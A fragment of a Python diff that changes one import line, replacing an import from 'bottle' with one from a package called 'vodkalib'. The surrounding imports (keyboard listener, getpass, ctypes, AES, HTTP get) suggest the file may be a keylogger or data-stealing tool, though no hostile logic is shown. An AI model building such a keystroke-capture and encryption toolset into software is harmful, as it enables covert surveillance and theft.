@@ -16,7 +16,7 @@ from requests import  get
 from webbrowser import  open as op
 import getpass
 import ctypes
-from bottle import unicode
+from vodkalib import unicode
 from pynput.keyboard import Listener
 import time
 from Crypto.Cipher import AES
